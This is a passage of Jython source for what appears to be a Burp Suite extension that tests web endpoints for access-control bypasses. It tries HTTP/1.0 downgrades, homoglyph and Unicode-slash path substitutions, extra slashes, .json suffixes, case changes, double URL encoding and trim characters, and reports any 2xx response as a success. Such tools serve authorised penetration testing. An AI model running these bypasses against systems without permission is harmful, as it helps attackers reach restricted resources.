                        "status": newStatusCode,
                        "length": contentLength,
                        "http_message": newRequestResult
                    }
                    return result_data

        except Exception as e:
            print("    (!) Error testing POST+CL:0: {}".format(e))
            # import traceback; traceback.print_exc(file=sys.stderr) # For debugging

        return None

    # --- tryBypassWithDowngradedHttpAndNoHeaders ---
    def tryBypassWithDowngradedHttpAndNoHeaders(self, baseRequestResponse, httpService, falsePositiveKeywords):
        print("  [Protocol] Testing HTTP/1.0 downgrade")
        requestInfo = None
        originalJavaHeaders = None
        originalBody = None
        try:
            requestInfo = self.helpers.analyzeRequest(baseRequestResponse)
            if requestInfo is None:
                 print("    (!) Failed analyze.")
                 return None

            # Get original components
            originalJavaHeaders = requestInfo.getHeaders()
            raw_bytes = baseRequestResponse.getRequest()
            offset = requestInfo.getBodyOffset()
            if len(raw_bytes) > offset:
                originalBody = java.util.Arrays.copyOfRange(raw_bytes, offset, len(raw_bytes))
            else:
                originalBody = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 0)

            if not originalJavaHeaders or originalJavaHeaders.isEmpty():
                print("    (!) No headers.")
                return None

        except Exception as analysis_err:
             print("    (!) Error analyzing request for HTTP downgrade: {}".format(analysis_err))
             return None

        try:
            # Modify protocol version
            first_line = originalJavaHeaders.get(0)
            newLine = None
            if " HTTP/1.1" in first_line:
                newLine = first_line.replace(" HTTP/1.1", " HTTP/1.0", 1)
            elif " HTTP/2" in first_line:
                newLine = first_line.replace(" HTTP/2", " HTTP/1.0", 1)
            elif " HTTP/1.0" in first_line:
                print("    Skipping: Already HTTP/1.0.")
                return None # Already 1.0
            else:
                print("    (!) Cannot determine HTTP version.")
                return None # Cannot determine version

            # Build minimal headers (Request Line + Host)
            headers = ArrayList()
            headers.add(String(newLine))
            host_header = None
            # Find Host header
            for i in range(1, originalJavaHeaders.size()):
                hdr = originalJavaHeaders.get(i)
                if hdr and hdr.lower().startswith("host:"): # Check if hdr is not None
                    host_header = hdr
                    break
            # Add Host header if found, otherwise try to construct
            if host_header:
                headers.add(host_header)
            else:
                host_from_service = httpService.getHost()
                if host_from_service:
                    headers.add("Host: " + host_from_service)
                    print("    Warn: Host header constructed from service info.")
                else:
                    print("    (!) Critical Warning: Could not find or construct Host header.")
                    # Proceeding without Host might fail, but maybe worth trying for some servers
            print("    Downgraded to HTTP/1.0, using minimal headers.")

            # Send request
            newRequestBytes = self.helpers.buildHttpMessage(headers, originalBody)
            newRequestResult = self.callbacks.makeHttpRequest(httpService, newRequestBytes)
            responseBytes = newRequestResult.getResponse()
            if responseBytes is None:
                return None

            # Check response
            responseInfo = self.helpers.analyzeResponse(responseBytes)
            if responseInfo is None:
                 print("      (!) Failed to analyze response for HTTP downgrade bypass.")
                 return None

            newStatusCode = responseInfo.getStatusCode()
            if 200 <= newStatusCode < 300:
                is_fp = self.isFalsePositive(responseBytes, falsePositiveKeywords)
                if not is_fp:
                    requestUrlStr = str(requestInfo.getUrl())
                    contentLength = "N/A"
                    try:
                        resp_headers = responseInfo.getHeaders()
                        for idx in range(1, resp_headers.size()):
                            header = resp_headers.get(idx)
                            if header and header.lower().startswith("content-length:"):
                                contentLength = header.split(":", 1)[1].strip()
                                break
                    except Exception as cl_err:
                         print("      (!) Error getting Content-Length: {}".format(cl_err))
                         pass

                    print("      ****** SUCCESS (HTTP Downgrade Bypass) ******")
                    print("      URL: " + requestUrlStr)
                    # Return values needed for the simple text format
                    result_data = {
                        "type": "HTTP Downgrade",
                        "url": requestUrlStr,
                        "technique": "HTTP/1.0 (minimal headers)",
                        "status": newStatusCode,
                        "length": contentLength,
                        "http_message": newRequestResult
                    }
                    return result_data

        except Exception as e:
            print("    (!) Error testing HTTP/1.0: {}".format(e))
            # import traceback; traceback.print_exc(file=sys.stderr) # For debugging

        return None

    # --- tryBypassWithHomoglyph ---
    def tryBypassWithHomoglyph(self, baseRequestResponse, httpService, falsePositiveKeywords):
        print("  [Homoglyph] Testing path character replacements...")
        originalRequestInfo = None; originalHeadersJavaList = None; originalBody = None; originalUrl = None; originalPathUnicode = "/"; original_method = None; original_protocol = "HTTP/1.1";
        try:
            # --- Analyze Request ---
            originalRequestInfo = self.helpers.analyzeRequest(baseRequestResponse)
            if originalRequestInfo is None: print("    (!) Failed analyze."); return None

            originalHeadersJavaList = originalRequestInfo.getHeaders()
            raw_bytes = baseRequestResponse.getRequest()
            offset = originalRequestInfo.getBodyOffset()
            if len(raw_bytes) > offset: originalBody = java.util.Arrays.copyOfRange(raw_bytes, offset, len(raw_bytes))
            else: originalBody = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 0)

            originalUrl = originalRequestInfo.getUrl()
            originalPath = originalUrl.getPath() if originalUrl else "/"
            if originalPath is None or not originalPath: originalPath = "/"

            # Ensure path is unicode
            try:
                originalPathUnicode = originalPath.decode('utf-8') if isinstance(originalPath, str) else originalPath
            except UnicodeDecodeError:
                print("    (!) Error decoding path: {}".format(repr(originalPath)))
                return None

            # Check headers exist
            if not originalHeadersJavaList or originalHeadersJavaList.isEmpty(): print("    (!) No headers."); return None

            # Get method/protocol
            request_line_parts = originalHeadersJavaList.get(0).split(" ", 2)
            if len(request_line_parts) < 3: print("    (!) Malformed line."); return None
            original_method = request_line_parts[0]
            original_protocol = request_line_parts[2]

        except Exception as analysis_err:
             print("    (!) Error analyzing request: {}".format(analysis_err))
             return None

        try:
            # --- Find Alpha Chars ---
            first_alpha_idx = -1; first_alpha_char = None; last_alpha_idx = -1; last_alpha_char = None;
            for i, char in enumerate(originalPathUnicode):
                if char.isalpha():
                    if first_alpha_idx == -1:
                        first_alpha_idx = i
                        first_alpha_char = char
                    # Keep updating last seen alpha char
                    last_alpha_idx = i
                    last_alpha_char = char
            # Exit if no alpha chars found
            if first_alpha_idx == -1:
                 print("    No alpha chars in path.")
                 return None

            # --- Test First Alpha ---
            if first_alpha_char:
                char_lower = first_alpha_char.lower()
                if char_lower in homoglyphMap:
                    for homoglyph in homoglyphMap[char_lower]:
                        try:
                            # Create new path
                            newPath = originalPathUnicode[:first_alpha_idx] + homoglyph + originalPathUnicode[first_alpha_idx + 1:]
                            # Build request
                            newLine = unicode(original_method) + u" " + newPath + u" " + unicode(original_protocol)
                            newHeaders = ArrayList()
                            newHeaders.add(String(newLine)) # Pass unicode string
                            if originalHeadersJavaList.size() > 1:
                                for idx in range(1, originalHeadersJavaList.size()):
                                    newHeaders.add(originalHeadersJavaList.get(idx))
                            newBytes = self.helpers.buildHttpMessage(newHeaders, originalBody)
                            # Send request
                            newResult = self.callbacks.makeHttpRequest(httpService, newBytes)
                            respBytes = newResult.getResponse()
                            if respBytes is None:
                                continue
                            # Check response
                            respInfo = self.helpers.analyzeResponse(respBytes)
                            if respInfo is None: continue
                            status = respInfo.getStatusCode()
                            if 200 <= status < 300:
                                is_fp = self.isFalsePositive(respBytes, falsePositiveKeywords)
                                if not is_fp:
                                    pathStr = repr(newPath)
                                    length = "N/A"
                                    try:
                                        resp_headers = respInfo.getHeaders()
                                        for idx in range(1, resp_headers.size()):
                                            h = resp_headers.get(idx)
                                            if h and h.lower().startswith("content-length:"):
                                                length = h.split(":", 1)[1].strip()
                                                break
                                    except Exception: pass
                                    print("      ****** SUCCESS (Homoglyph Bypass - First) ******")
                                    print("      Path: " + pathStr)
                                    print("      Original: " + repr(first_alpha_char))
                                    print("      Homoglyph: " + repr(homoglyph))
                                    # Return values needed for the simple text format
                                    result_data = {
                                        "type": "Homoglyph (First)",
                                        "bypassed_path": pathStr,
                                        "original_char": repr(first_alpha_char),
                                        "homoglyph": repr(homoglyph),
                                        "index": first_alpha_idx,
                                        "status": status,
                                        "length": length,
                                        "http_message": newResult
                                    }
                                    return result_data
                        except Exception as e:
                            print("      (!) Error processing homoglyph '{}' (first): {}".format(repr(homoglyph), e))
                            # import traceback; traceback.print_exc(file=sys.stderr) # For debugging

            # --- Test Last Alpha (if different) ---
            if last_alpha_char and last_alpha_idx != first_alpha_idx:
                char_lower = last_alpha_char.lower()
                if char_lower in homoglyphMap:
                    for homoglyph in homoglyphMap[char_lower]:
                        try:
                            # Create new path
                            newPath = originalPathUnicode[:last_alpha_idx] + homoglyph + originalPathUnicode[last_alpha_idx + 1:]
                            # Build request
                            newLine = unicode(original_method) + u" " + newPath + u" " + unicode(original_protocol)
                            newHeaders = ArrayList()
                            newHeaders.add(String(newLine)) # Pass unicode string
                            if originalHeadersJavaList.size() > 1:
                                for idx in range(1, originalHeadersJavaList.size()):
                                    newHeaders.add(originalHeadersJavaList.get(idx))
                            newBytes = self.helpers.buildHttpMessage(newHeaders, originalBody)
                            # Send request
                            newResult = self.callbacks.makeHttpRequest(httpService, newBytes)
                            respBytes = newResult.getResponse()
                            if respBytes is None:
                                continue
                            # Check response
                            respInfo = self.helpers.analyzeResponse(respBytes)
                            if respInfo is None: continue
                            status = respInfo.getStatusCode()
                            if 200 <= status < 300:
                                is_fp = self.isFalsePositive(respBytes, falsePositiveKeywords)
                                if not is_fp:
                                    pathStr = repr(newPath)
                                    length = "N/A"
                                    try:
                                        resp_headers = respInfo.getHeaders()
                                        for idx in range(1, resp_headers.size()):
                                            h = resp_headers.get(idx)
                                            if h and h.lower().startswith("content-length:"):
                                                length = h.split(":", 1)[1].strip()
                                                break
                                    except Exception: pass
                                    print("      ****** SUCCESS (Homoglyph Bypass - Last) ******")
                                    print("      Path: " + pathStr)
                                    print("      Original: " + repr(last_alpha_char))
                                    print("      Homoglyph: " + repr(homoglyph))
                                    # Return values needed for the simple text format
                                    result_data = {
                                        "type": "Homoglyph (Last)",
                                        "bypassed_path": pathStr,
                                        "original_char": repr(last_alpha_char),
                                        "homoglyph": repr(homoglyph),
                                        "index": last_alpha_idx,
                                        "status": status,
                                        "length": length,
                                        "http_message": newResult
                                    }
                                    return result_data
                        except Exception as e:
                            print("      (!) Error processing homoglyph '{}' (last): {}".format(repr(homoglyph), e))
                            # import traceback; traceback.print_exc(file=sys.stderr) # For debugging

        except Exception as outer_e:
            print("    (!) Error during homoglyph checks: {}".format(outer_e))
            # import traceback; traceback.print_exc(file=sys.stderr) # For debugging

        return None


    # --- NEW Bypass Test Functions ---

    def tryBypassWithExtraSlash(self, baseRequestResponse, httpService, falsePositiveKeywords, sensitive_indices):
        print("  [Segment Mod] Testing Extra Slash (//)")
        if sensitive_indices is None or not sensitive_indices:
            print("    Skipping: No sensitive indices identified.")
            return None

        originalRequestInfo = None; originalUrl = None; originalPath = "/"; originalHeaders = None; originalMethod = None; originalProtocol = "HTTP/1.1"; originalBodyBytes = None; segments = [];
        try:
            # Analyze original request once
            originalRequestInfo = self.helpers.analyzeRequest(baseRequestResponse)
            if originalRequestInfo is None: return None
            originalUrl = originalRequestInfo.getUrl()
            tempPath = originalUrl.getPath() if originalUrl else "/"
            if tempPath is None or not tempPath or tempPath == "/": return None
            originalPath = tempPath
            originalHeaders = list(originalRequestInfo.getHeaders())
            originalMethod = originalRequestInfo.getMethod()
            request_line_parts = originalHeaders[0].split(" ", 2)
            if len(request_line_parts) == 3: originalProtocol = request_line_parts[2]
            originalBodyOffset = originalRequestInfo.getBodyOffset()
            raw_req = baseRequestResponse.getRequest()
            if len(raw_req) > originalBodyOffset: originalBodyBytes = java.util.Arrays.copyOfRange(raw_req, originalBodyOffset, len(raw_req))
            else: originalBodyBytes = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 0)
            segments = [s for s in originalPath.strip('/').split('/')]
        except Exception as analysis_err:
            print("    (!) Error analyzing request: {}".format(analysis_err))
            return None

        for i in sensitive_indices:
            if i >= len(segments):
                continue # Index out of bounds

            print("    Testing extra slash before segment {}: '{}'".format(i, segments[i]))
            temp_segments = list(segments)
            # Construct path: /part1//sensitive/part3 or //sensitive/part2
            modifiedPath = ""
            for k, seg in enumerate(temp_segments):
                modifiedPath += "/"
                if k == i:
                    modifiedPath += "/" # Add extra slash before sensitive segment
                modifiedPath += seg
            if originalPath.endswith('/'):
                modifiedPath += "/" # Preserve trailing slash

            try:
                # Build and send request
                new_request_line = "{} {} {}".format(originalMethod, modifiedPath, originalProtocol)
                newHeadersList = ArrayList()
                newHeadersList.add(String(new_request_line))
                if len(originalHeaders) > 1:
                    for h_idx in range(1, len(originalHeaders)):
                        newHeadersList.add(originalHeaders[h_idx])
                newRequestBytes = self.helpers.buildHttpMessage(newHeadersList, originalBodyBytes)
                newRequestResult = self.callbacks.makeHttpRequest(httpService, newRequestBytes)
                responseBytes = newRequestResult.getResponse()
                if responseBytes is None:
                    continue

                # Check response
                responseInfo = self.helpers.analyzeResponse(responseBytes)
                if responseInfo is None: continue
                newStatusCode = responseInfo.getStatusCode()
                if 200 <= newStatusCode < 300:
                    is_fp = self.isFalsePositive(responseBytes, falsePositiveKeywords)
                    if not is_fp:
                        contentLength = "N/A"
                        try:
                            resp_headers = responseInfo.getHeaders()
                            for idx in range(1, resp_headers.size()):
                                header = resp_headers.get(idx)
                                if header and header.lower().startswith("content-length:"):
                                    contentLength = header.split(":", 1)[1].strip()
                                    break
                        except Exception: pass
                        print("      ****** SUCCESS (Extra Slash Bypass) ******")
                        print("      Path: " + modifiedPath)
                        result_data = {
                            "type": "Extra Slash",
                            "url": str(originalUrl),
                            "technique": "Extra slash before segment {}".format(i),
                            "bypassed_path": modifiedPath,
                            "status": newStatusCode,
                            "length": contentLength,
                            "http_message": newRequestResult
                        }
                        return result_data
            except Exception as req_err:
                print("      (!) Error sending request for extra slash on segment {}: {}".format(i, req_err))
                continue
        # No success after checking all sensitive indices
        return None

    def tryBypassWithAppendJson(self, baseRequestResponse, httpService, falsePositiveKeywords, sensitive_indices):
        print("  [Segment Mod] Testing Append .json")
        if sensitive_indices is None or not sensitive_indices:
             print("    Skipping: No sensitive indices identified.")
             return None

        originalRequestInfo = None; originalUrl = None; originalPath = "/"; originalHeaders = None; originalMethod = None; originalProtocol = "HTTP/1.1"; originalBodyBytes = None; segments = [];
        try:
            # Analyze original request
            originalRequestInfo = self.helpers.analyzeRequest(baseRequestResponse)
            if originalRequestInfo is None: return None
            originalUrl = originalRequestInfo.getUrl()
            tempPath = originalUrl.getPath() if originalUrl else "/"
            if tempPath is None or not tempPath or tempPath == "/": return None
            originalPath = tempPath
            originalHeaders = list(originalRequestInfo.getHeaders())
            originalMethod = originalRequestInfo.getMethod()
            request_line_parts = originalHeaders[0].split(" ", 2)
            if len(request_line_parts) == 3: originalProtocol = request_line_parts[2]
            originalBodyOffset = originalRequestInfo.getBodyOffset()
            raw_req = baseRequestResponse.getRequest()
            if len(raw_req) > originalBodyOffset: originalBodyBytes = java.util.Arrays.copyOfRange(raw_req, originalBodyOffset, len(raw_req))
            else: originalBodyBytes = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 0)
            segments = [s for s in originalPath.strip('/').split('/')]
        except Exception as analysis_err:
             print("    (!) Error analyzing request: {}".format(analysis_err))
             return None

        for i in sensitive_indices:
            if i >= len(segments):
                continue

            print("    Testing append .json to segment {}: '{}'".format(i, segments[i]))
            temp_segments = list(segments)
            temp_segments[i] = segments[i] + ".json" # Append .json
            modifiedPath = "/" + "/".join(temp_segments)
            # Handle trailing slash carefully
            if originalPath.endswith('/') and i == len(segments) - 1:
                 pass # Don't add trailing slash if .json is appended to last segment
            elif originalPath.endswith('/'):
                 modifiedPath += "/"

            try:
                # Build and send request
                new_request_line = "{} {} {}".format(originalMethod, modifiedPath, originalProtocol)
                newHeadersList = ArrayList()
                newHeadersList.add(String(new_request_line))
                if len(originalHeaders) > 1:
                    for h_idx in range(1, len(originalHeaders)):
                         newHeadersList.add(originalHeaders[h_idx])
                newRequestBytes = self.helpers.buildHttpMessage(newHeadersList, originalBodyBytes)
                newRequestResult = self.callbacks.makeHttpRequest(httpService, newRequestBytes)
                responseBytes = newRequestResult.getResponse()
                if responseBytes is None:
                    continue

                # Check response
                responseInfo = self.helpers.analyzeResponse(responseBytes)
                if responseInfo is None: continue
                newStatusCode = responseInfo.getStatusCode()
                if 200 <= newStatusCode < 300:
                    is_fp = self.isFalsePositive(responseBytes, falsePositiveKeywords)
                    if not is_fp:
                        contentLength = "N/A"
                        try:
                            resp_headers = responseInfo.getHeaders()
                            for idx in range(1, resp_headers.size()):
                                header = resp_headers.get(idx)
                                if header and header.lower().startswith("content-length:"):
                                     contentLength = header.split(":", 1)[1].strip()
                                     break
                        except Exception: pass
                        print("      ****** SUCCESS (Append .json Bypass) ******")
                        print("      Path: " + modifiedPath)
                        result_data = {
                            "type": "Append .json",
                            "url": str(originalUrl),
                            "technique": "Append .json to segment {}".format(i),
                            "bypassed_path": modifiedPath,
                            "status": newStatusCode,
                            "length": contentLength,
                            "http_message": newRequestResult
                        }
                        return result_data
            except Exception as req_err:
                print("      (!) Error sending request for append .json on segment {}: {}".format(i, req_err))
                continue
        return None

    def tryBypassWithUppercaseLast(self, baseRequestResponse, httpService, falsePositiveKeywords, sensitive_indices):
        print("  [Segment Mod] Testing Uppercase Last Letter")
        if sensitive_indices is None or not sensitive_indices:
            print("    Skipping: No sensitive indices identified.")
            return None
        originalRequestInfo = None; originalUrl = None; originalPath = "/"; originalHeaders = None; originalMethod = None; originalProtocol = "HTTP/1.1"; originalBodyBytes = None; segments = [];
        try:
            # Analyze original request
            originalRequestInfo = self.helpers.analyzeRequest(baseRequestResponse)
            if originalRequestInfo is None: return None
            originalUrl = originalRequestInfo.getUrl(); tempPath = originalUrl.getPath() if originalUrl else "/";
            if tempPath is None or not tempPath or tempPath == "/": return None;
            originalPath = tempPath; originalHeaders = list(originalRequestInfo.getHeaders()); originalMethod = originalRequestInfo.getMethod(); request_line_parts = originalHeaders[0].split(" ", 2);
            if len(request_line_parts) == 3: originalProtocol = request_line_parts[2];
            originalBodyOffset = originalRequestInfo.getBodyOffset(); raw_req = baseRequestResponse.getRequest();
            if len(raw_req) > originalBodyOffset: originalBodyBytes = java.util.Arrays.copyOfRange(raw_req, originalBodyOffset, len(raw_req));
            else: originalBodyBytes = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 0);
            segments = [s for s in originalPath.strip('/').split('/')];
        except Exception as analysis_err:
            print("    (!) Error analyzing request: {}".format(analysis_err));
            return None;

        for i in sensitive_indices:
            if i >= len(segments) or not segments[i]: continue; # Skip empty segments

            segment = segments[i];
            # Only test if last char is lowercase
            if segment[-1].islower():
                modified_segment = segment[:-1] + segment[-1].upper();
                print("    Testing uppercase last letter for segment {}: '{}' -> '{}'".format(i, segment, modified_segment));

                temp_segments = list(segments);
                temp_segments[i] = modified_segment;
                modifiedPath = "/" + "/".join(temp_segments);
                if originalPath.endswith('/'):
                    modifiedPath += "/";

                try:
                    # Build and send request
                    new_request_line = "{} {} {}".format(originalMethod, modifiedPath, originalProtocol);
                    newHeadersList = ArrayList();
                    newHeadersList.add(String(new_request_line));
                    if len(originalHeaders) > 1:
                        for h_idx in range(1, len(originalHeaders)): newHeadersList.add(originalHeaders[h_idx]);
                    newRequestBytes = self.helpers.buildHttpMessage(newHeadersList, originalBodyBytes);
                    newRequestResult = self.callbacks.makeHttpRequest(httpService, newRequestBytes);
                    responseBytes = newRequestResult.getResponse();
                    if responseBytes is None: continue;

                    # Check response
                    responseInfo = self.helpers.analyzeResponse(responseBytes);
                    if responseInfo is None: continue
                    newStatusCode = responseInfo.getStatusCode();
                    if 200 <= newStatusCode < 300:
                        is_fp = self.isFalsePositive(responseBytes, falsePositiveKeywords);
                        if not is_fp:
                            contentLength = "N/A";
                            try:
                                resp_headers = responseInfo.getHeaders();
                                for idx in range(1, resp_headers.size()):
                                    header = resp_headers.get(idx);
                                    if header and header.lower().startswith("content-length:"): contentLength = header.split(":", 1)[1].strip(); break;
                            except Exception: pass;
                            print("      ****** SUCCESS (Uppercase Last Bypass) ******");
                            print("      Path: " + modifiedPath);
                            result_data = {
                                "type": "Uppercase Last Letter",
                                "url": str(originalUrl),
                                "technique": "Uppercase last letter of segment {}".format(i),
                                "bypassed_path": modifiedPath,
                                "status": newStatusCode,
                                "length": contentLength,
                                "http_message": newRequestResult
                            }
                            return result_data;
                except Exception as req_err:
                    print("      (!) Error sending request for uppercase last on segment {}: {}".format(i, req_err));
                    continue;
            else:
                print("    Skipping uppercase for segment {}: last char not lowercase.".format(i));
        return None;

    def tryBypassWithUnicodeSlash(self, baseRequestResponse, httpService, falsePositiveKeywords, sensitive_indices):
        print("  [Segment Mod] Testing Unicode Slash (%ef%bc%8f)")
        unicode_slash_encoded = "%ef%bc%8f"; # Fullwidth solidus URL Encoded
        if sensitive_indices is None or not sensitive_indices:
            print("    Skipping: No sensitive indices identified.")
            return None;

        originalRequestInfo = None; originalUrl = None; originalPath = "/"; originalHeaders = None; originalMethod = None; originalProtocol = "HTTP/1.1"; originalBodyBytes = None; segments = [];
        try:
            # Analyze original request
            originalRequestInfo = self.helpers.analyzeRequest(baseRequestResponse);
            if originalRequestInfo is None: return None;
            originalUrl = originalRequestInfo.getUrl(); tempPath = originalUrl.getPath() if originalUrl else "/";
            if tempPath is None or not tempPath or tempPath == "/": return None;
            originalPath = tempPath; originalHeaders = list(originalRequestInfo.getHeaders()); originalMethod = originalRequestInfo.getMethod(); request_line_parts = originalHeaders[0].split(" ", 2);
            if len(request_line_parts) == 3: originalProtocol = request_line_parts[2];
            originalBodyOffset = originalRequestInfo.getBodyOffset(); raw_req = baseRequestResponse.getRequest();
            if len(raw_req) > originalBodyOffset: originalBodyBytes = java.util.Arrays.copyOfRange(raw_req, originalBodyOffset, len(raw_req));
            else: originalBodyBytes = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 0);
            segments = [s for s in originalPath.strip('/').split('/')];
        except Exception as analysis_err:
            print("    (!) Error analyzing request: {}".format(analysis_err));
            return None;

        for i in sensitive_indices:
            if i >= len(segments): continue;

            print("    Testing unicode slash before segment {}: '{}'".format(i, segments[i]));
            temp_segments = list(segments);
            modifiedPath = "";
            start_index = 0;
            # Handle leading slash case separately
            if i == 0 and originalPath.startswith('/'):
                # Replace leading slash if first segment is sensitive
                modifiedPath = unicode_slash_encoded + temp_segments[0];
                start_index = 1;
            elif originalPath.startswith('/'):
                modifiedPath = "/" + temp_segments[0]; # Start with leading slash and first segment
                start_index = 1;
            else:
                # Path doesn't start with slash, first segment is index 0
                if i == 0: # Cannot replace a slash that isn't there
                     print("      Skipping unicode slash for first segment (no preceding slash)");
                     continue;
                else:
                     modifiedPath = temp_segments[0];
                     start_index = 1;

            # Append remaining segments with appropriate slash
            for k in range(start_index, len(temp_segments)):
                if k == i:
                    modifiedPath += unicode_slash_encoded; # Replace slash before sensitive segment
                else:
                    modifiedPath += "/"; # Use normal slash
                modifiedPath += temp_segments[k];

            # Preserve trailing slash if present
            if originalPath.endswith('/') and not modifiedPath.endswith('/'):
                modifiedPath += "/";

            try:
                # Build and send request
                # Path already contains the encoded form, pass directly
                new_request_line = "{} {} {}".format(originalMethod, modifiedPath, originalProtocol);
                newHeadersList = ArrayList();
                newHeadersList.add(String(new_request_line));
                if len(originalHeaders) > 1:
                    for h_idx in range(1, len(originalHeaders)):
                        newHeadersList.add(originalHeaders[h_idx]);
                newRequestBytes = self.helpers.buildHttpMessage(newHeadersList, originalBodyBytes);
                newRequestResult = self.callbacks.makeHttpRequest(httpService, newRequestBytes);
                responseBytes = newRequestResult.getResponse();
                if responseBytes is None: continue;

                # Check response
                responseInfo = self.helpers.analyzeResponse(responseBytes);
                if responseInfo is None: continue
                newStatusCode = responseInfo.getStatusCode();
                if 200 <= newStatusCode < 300:
                    is_fp = self.isFalsePositive(responseBytes, falsePositiveKeywords);
                    if not is_fp:
                        contentLength = "N/A";
                        try:
                            resp_headers = responseInfo.getHeaders();
                            for idx in range(1, resp_headers.size()):
                                header = resp_headers.get(idx);
                                if header and header.lower().startswith("content-length:"):
                                     contentLength = header.split(":", 1)[1].strip(); break;
                        except Exception: pass;
                        print("      ****** SUCCESS (Unicode Slash Bypass) ******");
                        print("      Path: " + modifiedPath);
                        result_data = {
                            "type": "Unicode Slash",
                            "url": str(originalUrl),
                            "technique": "Replace / with {} before segment {}".format(unicode_slash_encoded, i),
                            "bypassed_path": modifiedPath,
                            "status": newStatusCode,
                            "length": contentLength,
                            "http_message": newRequestResult
                        }
                        return result_data;
            except Exception as req_err:
                print("      (!) Error sending request for unicode slash on segment {}: {}".format(i, req_err));
                continue;
        return None;

    def tryBypassWithDoubleEncoding(self, baseRequestResponse, httpService, falsePositiveKeywords, sensitive_indices):
        print("  [Segment Mod] Testing Double URL Encoding")
        # This check relies on query payload logic, which already targets sensitive indices
        for payload_to_encode in payloadsToDoubleEncode:
            # Get single encoding first
            single_encoded = self.urlEncodeChar(payload_to_encode) if len(payload_to_encode) == 1 else URLEncoder.encode(payload_to_encode, "UTF-8")
            double_encoded_payload = single_encoded.replace('%', '%25')

            # If single == double (e.g., non-percent chars), skip double encoding test for this
            if single_encoded == double_encoded_payload:
                continue

            print("    Testing double encoded payload: '{}' -> '{}'".format(payload_to_encode, double_encoded_payload))

            # Call the existing query payload function with the double encoded payload
            # It will use generatePayloads focused on sensitive indices (or fallback)
            result_dict = self.tryBypassWithQueryPayload(baseRequestResponse, double_encoded_payload, httpService, falsePositiveKeywords, sensitive_indices)
            if result_dict:
                # Modify the type description for clarity
                result_dict["type"] = "Double URL Encode"
                result_dict["technique"] = "Double encoding of '{}'".format(payload_to_encode)
                result_dict["payload_used"] = double_encoded_payload # Show the actual payload sent
                print("      ****** SUCCESS (Double Encoding Bypass) ******")
                # No need to print again, tryBypassWithQueryPayload already did
                return result_dict # Return the dictionary from the successful call
        return None

    # Modified to handle literal unicode chars and append
    def tryBypassWithTrimChars(self, baseRequestResponse, httpService, falsePositiveKeywords, sensitive_indices):
        print("  [Segment Mod] Testing Trim Characters")
        if sensitive_indices is None or not sensitive_indices:
             print("    Skipping: No sensitive indices identified.")
             return None

        originalRequestInfo = None; originalUrl = None; originalPathUnicode = "/"; originalHeaders = None; originalMethod = None; originalProtocol = "HTTP/1.1"; originalBodyBytes = None; segmentsUnicode = [];
        try:
            # Analyze original request
            originalRequestInfo = self.helpers.analyzeRequest(baseRequestResponse)
            if originalRequestInfo is None: return None
            originalUrl = originalRequestInfo.getUrl(); originalPath = originalUrl.getPath() if originalUrl else "/"
            if originalPath is None or not originalPath or originalPath == "/": return None
            try:
                 originalPathUnicode = originalPath.decode('utf-8') if isinstance(originalPath, str) else originalPath
            except UnicodeDecodeError: print("    (!) Error decoding original path to UTF-8 for Trim Char check: {}".format(repr(originalPath))); return None

            originalHeaders = list(originalRequestInfo.getHeaders()); originalMethod = originalRequestInfo.getMethod(); request_line_parts = originalHeaders[0].split(" ", 2);
            if len(request_line_parts) == 3: originalProtocol = request_line_parts[2];
            originalBodyOffset = originalRequestInfo.getBodyOffset(); raw_req = baseRequestResponse.getRequest();
            if len(raw_req) > originalBodyOffset: originalBodyBytes = java.util.Arrays.copyOfRange(raw_req, originalBodyOffset, len(raw_req));
            else: originalBodyBytes = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 0);
            segmentsUnicode = [s.decode('utf-8') if isinstance(s, str) else s for s in originalPathUnicode.strip('/').split('/')];
        except Exception as analysis_err:
             print("    (!) Error analyzing request: {}".format(analysis_err))
             return None

        for i in sensitive_indices:
            if i >= len(segmentsUnicode): continue

            for trim_char in trimCharsToTest: # trimCharsToTest contains unicode chars
                # --- Test Prepending ---
                print("    Testing trim char U+{:04X} prepended to segment {}: '{}'".format(ord(trim_char), i, segmentsUnicode[i]))
                temp_segments = list(segmentsUnicode)
                # Prepend the Unicode trim character
                temp_segments[i] = trim_char + segmentsUnicode[i]
                # Join using unicode segments and slashes
                modifiedPathUnicode = u"/" + u"/".join(temp_segments)
                if originalPathUnicode.endswith('/'):
                    modifiedPathUnicode += u"/"

                try:
                    # Build and send request - Pass the unicode path string
                    new_request_line = unicode(originalMethod) + u" " + modifiedPathUnicode + u" " + unicode(originalProtocol)
                    newHeadersList = ArrayList()
                    # Let Jython handle encoding when creating Java String
                    newHeadersList.add(String(new_request_line))
                    if len(originalHeaders) > 1:
                        for h_idx in range(1, len(originalHeaders)):
                            newHeadersList.add(originalHeaders[h_idx])
                    newRequestBytes = self.helpers.buildHttpMessage(newHeadersList, originalBodyBytes)
                    newRequestResult = self.callbacks.makeHttpRequest(httpService, newRequestBytes)
                    responseBytes = newRequestResult.getResponse()
                    if responseBytes is None:
                        continue

                    # Check response
                    responseInfo = self.helpers.analyzeResponse(responseBytes)
                    if responseInfo is None: continue
                    newStatusCode = responseInfo.getStatusCode()
                    if 200 <= newStatusCode < 300:
                        is_fp = self.isFalsePositive(responseBytes, falsePositiveKeywords)
                        if not is_fp:
                            contentLength = "N/A"
                            try:
                                resp_headers = responseInfo.getHeaders()
                                for idx in range(1, resp_headers.size()):
                                    header = resp_headers.get(idx)
                                    if header and header.lower().startswith("content-length:"):
                                        contentLength = header.split(":", 1)[1].strip()
                                        break
                            except Exception: pass
                            print("      ****** SUCCESS (Trim Char Bypass - Prepend) ******")
                            print("      Path: " + repr(modifiedPathUnicode)) # Use repr for clarity
                            print("      Char: U+{:04X}".format(ord(trim_char)))
                            result_data = {
                                "type": "Trim Character (Prepend)",
                                "url": str(originalUrl),
                                "technique": "Prepend U+{:04X} to segment {}".format(ord(trim_char), i),
                                "bypassed_path": repr(modifiedPathUnicode),
                                "status": newStatusCode,
                                "length": contentLength,
                                "http_message": newRequestResult
                            }
                            return result_data
                except Exception as req_err:
                    print("      (!) Error sending request for prepend trim char U+{:04X} on segment {}: {}".format(ord(trim_char), i, req_err))
                    # import traceback; traceback.print_exc(file=sys.stderr) # For debugging
                    continue

                # --- Test Appending ---
                print("    Testing trim char U+{:04X} appended to segment {}: '{}'".format(ord(trim_char), i, segmentsUnicode[i]))
